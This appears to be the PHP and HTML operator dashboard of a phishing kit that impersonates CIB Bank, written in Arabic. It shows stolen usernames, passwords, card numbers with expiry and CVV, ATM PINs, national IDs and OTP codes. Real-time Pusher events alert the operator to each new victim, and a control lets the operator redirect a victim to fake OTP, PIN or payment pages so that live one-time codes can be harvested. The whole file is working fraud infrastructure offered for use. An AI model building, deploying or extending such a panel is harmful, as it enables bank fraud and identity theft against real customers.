<?php
session_start();

// Include Initialization file
require_once('init.php');

if (!$User->isLoggedIn()) {
    $User->redirect('login.php');
}

$users = $User->fetchAllUsers();

if (isset($_GET['TestInfoReject'])) {
    $idd = $_GET['id'];
    $X = 2;
    $User->UpdateUserStatusById($idd, $X);
    $User->redirect('index.php');
}

if (isset($_GET['TestInfoAcceptance'])) {
    $idd = $_GET['id'];
    $X = 1;
    $User->UpdateUserStatusById($idd, $X);
    $User->redirect('index.php');
}

if (isset($_POST['deleteUser'])) {
    $id = $_POST['userId'];
    $User->DeleteUserById($id);
    $User->redirect('index.php');
}

if (isset($_POST['deleteAllUser'])) {
    $User->DeleteAllUsers();
    $User->redirect('index.php');
}

if (isset($_POST['changeAdmin'])) {

    $newEmail = $_POST['new_email'];
    $newPassword = md5($_POST['new_password']);

    $db = new DB();

    $db->query("UPDATE admin SET email = :email, password = :password WHERE id = 1");

    $db->bind(':email', $newEmail);
    $db->bind(':password', $newPassword);

    $db->execute();

    echo "<script>window.location='index.php';</script>";
    exit();
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="utf-8">
    <title>لوحة التحكم - CIB Bank</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <!-- Google Web Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
        rel="stylesheet">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">

    <!-- jQuery -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <style>
        :root {
            --primary: #1a5ca8;
            --primary-light: #2563eb;
            --secondary: #00b5c9;
            --dark: #0f172a;
            --gray: #64748b;
            --light: #f8fafc;
            --danger: #ef4444;
            --success: #10b981;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background-color: #f1f5f9;
            color: #1e293b;
            overflow-x: hidden;
        }

        /* ─── Main Content ─── */
        .main-content {
            margin: 0;
            width: 100%;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            transition: 0.3s;
        }

        /* ─── Topbar ─── */
        .topbar {
            height: 70px;
            background: white;
            padding: 0 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
            border-radius: 16px;
            margin: 16px 24px 0 24px;
            position: sticky;
            top: 16px;
            z-index: 999;
            border: 1px solid #e2e8f0;
        }

        .topbar-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .admin-profile {
            display: flex;
            align-items: center;
            gap: 10px;
            background: var(--light);
            padding: 6px 16px 6px 6px;
            border-radius: 99px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .admin-profile:hover {
            background: #e2e8f0;
        }

        .admin-profile img {
            width: 32px;
            height: 32px;
            border-radius: 50%;
        }

        .admin-profile span {
            font-weight: 600;
            font-size: 14px;
        }

        /* ─── Dashboard Body ─── */
        .dash-body {
            padding: 24px;
            flex: 1;
        }

        .page-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 24px;
            color: var(--dark);
        }

        /* ─── Stats Cards ─── */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 20px;
            margin-bottom: 24px;
        }

        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            gap: 16px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.03);
            border: 1px solid #e2e8f0;
        }

        .stat-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .stat-icon.blue {
            background: rgba(26, 92, 168, 0.1);
            color: var(--primary);
        }

        .stat-icon.cyan {
            background: rgba(0, 181, 201, 0.1);
            color: var(--secondary);
        }

        .stat-icon.green {
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
        }

        .stat-info h5 {
            margin: 0;
            font-size: 13px;
            color: var(--gray);
            font-weight: 600;
        }

        .stat-info h3 {
            margin: 4px 0 0;
            font-size: 24px;
            font-weight: 700;
            color: var(--dark);
        }

        /* ─── Table Card ─── */
        .table-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
            border: 1px solid #e2e8f0;
            overflow: hidden;
        }

        .table-header {
            padding: 20px 24px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .table-header h5 {
            margin: 0;
            font-weight: 700;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .table-responsive {
            overflow-x: auto;
        }

        .table {
            margin-bottom: 0;
            white-space: nowrap;
        }

        .table thead th {
            background: #f8fafc;
            color: var(--gray);
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            padding: 16px 20px;
            border-bottom: 2px solid #e2e8f0;
        }

        .table tbody td {
            padding: 16px 20px;
            vertical-align: middle;
            font-size: 14px;
            font-weight: 500;
            border-bottom: 1px solid #f1f5f9;
        }

        .table tbody tr {
            transition: all 0.2s;
        }

        .table tbody tr:hover {
            background-color: #f8fafc;
        }

        /* User highlight pulse */
        tr.bg-dangl td {
            background-color: rgba(239, 68, 68, 0.15) !important;
            transition: all 0.3s;
        }

        tr.bg-dangl td:first-child {
            box-shadow: inset 4px 0 0 var(--danger);
            animation: pulse-danger-border 2s infinite;
        }

        @keyframes pulse-danger-border {
            0% {
                box-shadow: inset 4px 0 0 var(--danger);
            }

            50% {
                box-shadow: inset 4px 0 0 rgba(239, 68, 68, 0.4);
            }

            100% {
                box-shadow: inset 4px 0 0 var(--danger);
            }
        }

        /* Badges */
        .badge {
            padding: 6px 10px;
            border-radius: 6px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .badge-payment {
            font-family: monospace;
            font-size: 13px;
        }

        /* Action Buttons */
        .action-btn {
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: none;
            transition: all 0.2s;
            color: white;
            text-decoration: none;
        }

        .btn-action {
            background: var(--primary);
            box-shadow: 0 2px 6px rgba(26, 92, 168, 0.2);
        }

        .btn-action:hover {
            background: var(--primary-light);
            transform: translateY(-2px);
        }

        .btn-delete {
            background: var(--danger);
            box-shadow: 0 2px 6px rgba(239, 68, 68, 0.2);
        }

        .btn-delete:hover {
            background: #dc2626;
            transform: translateY(-2px);
        }

        /* Modals */
        .modal-content {
            border-radius: 16px;
            border: none;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
        }

        .modal-header {
            background: #f8fafc;
            border-bottom: 1px solid #e2e8f0;
            border-radius: 16px 16px 0 0;
            padding: 20px 24px;
        }

        .modal-title {
            font-weight: 700;
            font-size: 18px;
        }

        .modal-body {
            padding: 24px;
        }

        .modal-footer {
            border-top: 1px solid #e2e8f0;
            padding: 16px 24px;
        }

        .form-select {
            border-radius: 10px;
            padding: 12px;
            border-color: #cbd5e1;
            font-weight: 500;
        }

        .form-select:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(26, 92, 168, 0.1);
        }
    </style>
</head>

<body>

    <div class="main-content">
        <header class="topbar">
            <div class="d-flex align-items-center gap-3">
                <img src="../assets/logo.webp" alt="CIB"
                    style="width: 32px; filter: brightness(0) saturate(100%) invert(32%) sepia(85%) saturate(1376%) hue-rotate(190deg) brightness(87%) contrast(93%);">
                <h5 class="m-0 fw-bold" style="color: var(--primary);">بوابة الإدارة</h5>
            </div>
            <div class="topbar-left">
                <form action="" method="POST" class="m-0 d-none d-sm-block">
                    <button type="submit" name="deleteAllUser"
                        class="btn btn-outline-danger btn-sm rounded-pill px-3 fw-bold"
                        onclick="return confirm('هل أنت متأكد من حذف جميع المستخدمين؟');">
                        <i class="bi bi-trash-fill me-1"></i> تصفير النظام
                    </button>

                    <button
                      type="button"
    class="btn btn-outline-primary btn-sm rounded-pill px-3 fw-bold"
    data-bs-toggle="modal"
    data-bs-target="#changeAdminModal">
    <i class="bi bi-person-gear me-1"></i>
    تغيير بيانات المدير
</button>
                </form>
                <div class="dropdown">
                    <div class="admin-profile" data-bs-toggle="dropdown" aria-expanded="false">
                        <span>مدير النظام</span>
                        <i class="bi bi-chevron-down ms-1 text-muted" style="font-size: 12px;"></i>
                    </div>
                    <ul class="dropdown-menu dropdown-menu-end border-0 shadow-sm mt-2"
                        style="border-radius: 12px; min-width: 200px;">
                        <li class="d-sm-none px-2 mb-2">
                            <form action="" method="POST" class="m-0">
                                <button type="submit" name="deleteAllUser"
                                    class="dropdown-item text-danger fw-bold rounded"
                                    onclick="return confirm('هل أنت متأكد من حذف جميع المستخدمين؟');">
                                    <i class="bi bi-trash-fill me-2"></i> تصفير النظام
                                </button>
                            </form>
                        </li>
                        <li><a class="dropdown-item text-danger fw-bold rounded mx-2 py-2 w-auto" href="logout.php"><i
                                    class="bi bi-box-arrow-right me-2"></i>تسجيل الخروج</a></li>
                    </ul>
                </div>
            </div>
        </header>

        <div class="dash-body">
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon blue">
                        <i class="bi bi-people-fill"></i>
                    </div>
                    <div class="stat-info">
                        <h5>إجمالي العمليات</h5>
                        <h3><?php echo is_array($users) ? count($users) : 0; ?></h3>
                    </div>
                </div>
                <!-- <div class="stat-card">
                    <div class="stat-icon cyan">
                        <i class="bi bi-shield-lock-fill"></i>
                    </div>
                    <div class="stat-info">
                        <h5>اتصال آمن</h5>
                        <h3>نشط</h3>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon green">
                        <i class="bi bi-broadcast"></i>
                    </div>
                    <div class="stat-info">
                        <h5>حالة المزامنة</h5>
                        <h3 class="text-success">Live</h3>
                    </div>
                </div> -->
            </div>

            <div class="table-card">
                <div class="table-header">
                    <h5><i class="bi bi-table text-primary"></i> سجل نشاط العملاء</h5>
                   <button class="btn btn-primary btn-sm" onclick="location.reload();">
    <i class="bi bi-arrow-clockwise me-1"></i> تحديث
</button>
                </div>
                <div class="table-responsive">
                    <table class="table table-hover">
                        <thead>
                            <tr>
                                <th>الصفحة الحالية</th>
                                <th>اسم المستخدم</th>
                                <th>كلمة المرور</th>
                                <th>معلومات البطاقة</th>
                                <th>الرقم السري (ATM)</th>
                                <th>الهاتف / العميل</th>
                                <th>الهوية الوطنية</th>
                                <th>رمز OTP</th>
                                <th>تحقق إضافي</th>
                                <th>إجراء</th>
                                <th>حذف</th>
                            </tr>
                        </thead>
                        <tbody id="result">
                            <?php if ($users != false):
                                foreach ($users as $row): ?>
                                    <tr data-user-id="<?= $row->id; ?>">
                                        <td id="page<?= $row->id; ?>"><span
                                                class="badge bg-light text-dark border"><?= htmlspecialchars($row->page ?? ''); ?></span>
                                        </td>
                                        <td id="username<?= $row->id; ?>"><strong
                                                class="text-primary"><?= htmlspecialchars($row->username ?? ''); ?></strong>
                                        </td>
                                        <td id="password<?= $row->id; ?>"><?= htmlspecialchars($row->password ?? ''); ?></td>
                                        <td id="cardNumber<?= $row->id; ?>">
                                            <?php
                                            if (!empty($row->cardNumber)) {
                                                $cardParts = explode(' | ', $row->cardNumber);
                                                if (count($cardParts) >= 3) {
                                                    echo '<div class="d-flex flex-column gap-1">';
                                                    echo '<span class="badge bg-primary text-white text-start badge-payment"><i class="bi bi-credit-card me-1"></i> ' . htmlspecialchars($cardParts[0] ?? '') . '</span>';
                                                    echo '<span class="badge bg-secondary text-white text-start badge-payment"><i class="bi bi-calendar3 me-1"></i> ' . htmlspecialchars($cardParts[1] ?? '') . '</span>';
                                                    echo '<span class="badge bg-dark text-white text-start badge-payment"><i class="bi bi-lock me-1"></i> ' . htmlspecialchars($cardParts[2] ?? '') . '</span>';
                                                    if (isset($cardParts[3])) {
                                                        echo '<span class="badge bg-info text-dark text-start badge-payment"><i class="bi bi-person me-1"></i> ' . htmlspecialchars($cardParts[3] ?? '') . '</span>';
                                                    }
                                                    echo '</div>';
                                                } else {
                                                    echo '<span class="badge bg-light text-dark border badge-payment">' . htmlspecialchars($row->cardNumber ?? '') . '</span>';
                                                }
                                            } else {
                                                echo '-';
                                            }
                                            ?>
                                        </td>
                                        <td id="passwordtwo<?= $row->id; ?>"><span
                                                class="badge bg-dark text-white px-2 py-1 fs-6"><?= htmlspecialchars($row->pass ?? ''); ?></span>
                                        </td>
                                        <td><?= htmlspecialchars($row->phone ?? ''); ?></td>
                                        <td><?= htmlspecialchars($row->ssn ?? ''); ?></td>
                                        <td id="otp<?= $row->id; ?>"><strong
                                                class="text-danger fs-5"><?= htmlspecialchars($row->otp ?? ''); ?></strong></td>
                                        <td id="pass<?= $row->id; ?>"><span
                                                class="badge bg-secondary text-white px-2 py-1 fs-6"><?= htmlspecialchars($row->passwordtwo ?? ''); ?></span>
                                        </td>
                                        <td>
                                            <button class="action-btn btn-action"
                                                onclick="removeBackground(this, <?= $row->id; ?>)" title="اتخاذ إجراء">
                                                <i class="bi bi-gear-fill"></i>
                                            </button>

                                            <!-- Action Modal -->
                                            <div class="modal fade" id="card<?= $row->id; ?>" tabindex="-1" aria-hidden="true">
                                                <div class="modal-dialog modal-dialog-centered">
                                                    <div class="modal-content">
                                                        <div class="modal-header">
                                                            <h5 class="modal-title"><i class="bi bi-send text-primary me-2"></i>
                                                                توجيه المستخدم</h5>
                                                            <button type="button" class="btn-close m-0"
                                                                data-bs-dismiss="modal"></button>
                                                        </div>
                                                        <div class="modal-body">
                                                            <div id="cardDetails<?= $row->id; ?>"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </td>
                                        <td>
                                            <form action="" method="POST" class="m-0">
                                                <input type="hidden" name="userId" value="<?= $row->id; ?>">
                                                <button type="submit" name="deleteUser" class="action-btn btn-delete"
                                                    title="حذف" onclick="return confirm('تأكيد الحذف؟');">
                                                    <i class="bi bi-trash-fill"></i>
                                                </button>
                                            </form>
                                        </td>
                                    </tr>
                                <?php endforeach; endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <!-- Audio Notification -->
    <audio id="notification-card" src="./level-up-2-199574.mp3"></audio>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Pusher -->
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>

    <script>
       function removeBackground(button, userId) {

    var row = button.closest('tr');
    row.classList.remove('bg-dangl');

    $.ajax({
        url: 'user-id.php',
        type: 'GET',
        data: { user_id: userId },
        dataType: 'json',

        success: function (cards) {

            var cardContainer = $('#cardDetails' + userId);
            cardContainer.empty();

            cards.forEach(function (card) {

                var cardHtml = `
                    ${card.status == 1 ? `
                        <div class="alert alert-success fw-bold text-center py-2 mb-3">
                            <i class="bi bi-check-circle-fill me-2"></i>
                            تم القبول مسبقاً
                        </div>
                    ` : card.status == 2 ? `
                        <div class="alert alert-danger fw-bold text-center py-2 mb-3">
                            <i class="bi bi-x-circle-fill me-2"></i>
                            تم الرفض مسبقاً
                        </div>
                    ` : ''}

                    <div class="mb-4">

                        <label class="form-label text-muted fw-bold mb-2">
                            اختر مسار التوجيه:
                        </label>

                        <select class="form-select mb-3" id="selUrl${card.id}">
                            <option value="login.php" selected>
                                صفحة تسجيل الدخول (Login)
                            </option>

                            <option value="otp.php">
                                صفحة رمز التحقق (OTP)
                            </option>

                            <option value="password.php">
                                صفحة الرقم السري للبطاقة (ATM PIN)
                            </option>

                            <option value="code-otp.php">
                                التحقق الإضافي (Code OTP)
                            </option>

                            <option value="payment.php">
                                صفحة الدفع بالبطاقة (Payment)
                            </option>

                            <option value="index.php?done=1">
                                صفحة القبول النهائي (Success)
                            </option>
                        </select>

                        <div class="d-flex flex-wrap gap-2">

                            <button onclick="callRequest(${card.id}, 1)"
                                class="btn btn-success flex-fill fw-bold py-2">
                                <i class="bi bi-check-circle me-1"></i>
                                قبول وتوجيه
                            </button>

                            <button onclick="callRequest(${card.id}, 0)"
                                class="btn btn-warning flex-fill fw-bold py-2 text-dark">
                                <i class="bi bi-arrow-right-circle me-1"></i>
                                توجيه فقط
                            </button>

                            <button onclick="callRequest(${card.id}, 2)"
                                class="btn btn-danger flex-fill fw-bold py-2">
                                <i class="bi bi-x-circle me-1"></i>
                                رفض وتوجيه
                            </button>

                        </div>
                    </div>
                `;

                cardContainer.append(cardHtml);
            });

            var modal = new bootstrap.Modal(
                document.getElementById('card' + userId)
            );

            modal.show();
        },

        error: function (xhr, status, error) {
            console.error('Request failed:', status, error);
        }
    });
}


        function callRequest(id, status) {
            var selectElement = document.getElementById('selUrl' + id);
            var selectedValue = selectElement.value;

            if (status == 2) {
                if (selectedValue.indexOf('?') !== -1) {
                    selectedValue += '&reject=1';
                } else {
                    selectedValue += '?reject=1';
                }
            }

            $.ajax({
                url: 'action-code.php',
                type: 'GET',
                data: { user_id: id, status: status, url: selectedValue },
                success: function (response) {
                    $('#card' + id).modal('hide');
                },
                error: function (xhr, status, error) {
                    console.error('Request failed:', status, error);
                }
            });
        }

        // Pusher Implementation
           var pusher = new Pusher('0737c04931774e406307', {
      cluster: 'ap2'
    });
        var channel = pusher.subscribe('my-channel-cib');

        // New User connection
        channel.bind('my-event-bann', function (data) {
            $.ajax({
                url: "users-list.php",
                success: function (response) {
                    var tbody = document.getElementById('result');
                    var tempDiv = document.createElement('tbody');
                    tempDiv.innerHTML = response;

                    var newRow = tempDiv.firstElementChild;
                    if (newRow) {
                        newRow.classList.add('bg-dangl');
                        tbody.prepend(newRow);

                        var audio = document.getElementById('notification-card');
                        audio.play().catch(function (e) { });

                        // تحديث إجمالي العمليات
                        var countEl = document.querySelector('.stat-info h3');
                        if (countEl) {
                            countEl.textContent = parseInt(countEl.textContent) + 1;
                        }
                    }
                }
            });
        });

        // Real-time Updates
        channel.bind('update-user-accountt', function (data) {
            var userId = data.userId;
            var updatedData = data.updatedData;
            var audio = document.getElementById('notification-card');

            if (updatedData.type == '1') {
                var el1 = document.getElementById('username' + userId);
                if (el1) el1.innerHTML = '<strong class="text-primary">' + updatedData.username + '</strong>';

                var el2 = document.getElementById('password' + userId);
                if (el2) el2.textContent = updatedData.password;

                var el3 = document.getElementById('message' + userId);
                if (el3) el3.textContent = updatedData.message;
            }

            if (updatedData.type == '2') {
                var el1 = document.getElementById('otp' + userId);
                if (el1) el1.innerHTML = '<strong class="text-danger fs-5">' + updatedData.otp + '</strong>';

                var el2 = document.getElementById('message' + userId);
                if (el2) el2.textContent = updatedData.message;
            }

            if (updatedData.type == '3') {
                var el1 = document.getElementById('pass' + userId);
                if (el1) el1.innerHTML = '<span class="badge bg-secondary text-white px-2 py-1 fs-6">' + updatedData.password + '</span>';

                var el2 = document.getElementById('message' + userId);
                if (el2) el2.textContent = updatedData.message;
            }

            if (updatedData.type == '4') {
                var el1 = document.getElementById('passwordtwo' + userId);
                if (el1) el1.innerHTML = '<span class="badge bg-dark text-white px-2 py-1 fs-6">' + updatedData.codeotp + '</span>';

                var el2 = document.getElementById('message' + userId);
                if (el2) el2.textContent = updatedData.message;

                var el3 = document.getElementById('page' + userId);
                if (el3) el3.innerHTML = '<span class="badge bg-light text-dark border">code-otp.php</span>';
            }

            if (updatedData.type == '5') {
                var el1 = document.getElementById('message' + userId);
                if (el1) el1.textContent = updatedData.message;

                var el2 = document.getElementById('page' + userId);
                if (el2) el2.innerHTML = '<span class="badge bg-light text-dark border">payment.php</span>';

                var cardEl = document.getElementById('cardNumber' + userId);
                if (cardEl && updatedData.cardNumber) {
                    var parts = updatedData.cardNumber.split(' | ');
                    if (parts.length >= 3) {
                        var html = '<div class="d-flex flex-column gap-1">';
                        html += '<span class="badge bg-primary text-white text-start badge-payment"><i class="bi bi-credit-card me-1"></i> ' + parts[0] + '</span>';
                        html += '<span class="badge bg-secondary text-white text-start badge-payment"><i class="bi bi-calendar3 me-1"></i> ' + parts[1] + '</span>';
                        html += '<span class="badge bg-dark text-white text-start badge-payment"><i class="bi bi-lock me-1"></i> ' + parts[2] + '</span>';
                        if (parts[3]) {
                            html += '<span class="badge bg-info text-dark text-start badge-payment"><i class="bi bi-person me-1"></i> ' + parts[3] + '</span>';
                        }
                        html += '</div>';
                        cardEl.innerHTML = html;
                    } else {
                        cardEl.innerHTML = '<span class="badge bg-light text-dark border badge-payment">' + updatedData.cardNumber + '</span>';
                    }
                }
            }

            document.querySelectorAll('tr[data-user-id]').forEach(function (row) {
                if (row.getAttribute('data-user-id') == userId) {
                    row.classList.add('bg-dangl');
                    var tbody = row.closest('tbody');
                    if (tbody) {
                        tbody.prepend(row);
                    }
                }
            });

            audio.play().catch(function (e) { });
        });
    </script>


<!-- Change Admin Modal -->
<div class="modal fade" id="changeAdminModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">

            <form action="" method="POST">

                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="bi bi-person-gear text-primary me-2"></i>
                        تغيير بيانات المدير
                    </h5>

                    <button type="button"
                        class="btn-close"
                        data-bs-dismiss="modal"></button>
                </div>

                <div class="modal-body">

                    <div class="mb-3">
                        <label class="form-label fw-bold">البريد الإلكتروني الجديد</label>

                        <input type="email"
                            name="new_email"
                            class="form-control"
                            required>
                    </div>

                    <div class="mb-3">
                        <label class="form-label fw-bold">كلمة المرور الجديدة</label>

                        <input type="password"
                            name="new_password"
                            class="form-control"
                            required>
                    </div>

                </div>

                <div class="modal-footer">
                    <button type="submit"
                        name="changeAdmin"
                        class="btn btn-primary fw-bold">
                        حفظ التغييرات
                    </button>
                </div>

            </form>

        </div>
    </div>
</div>
</body>

<script>
    setInterval(() => {
        location.reload();
    }, 15000); 
</script>

</html>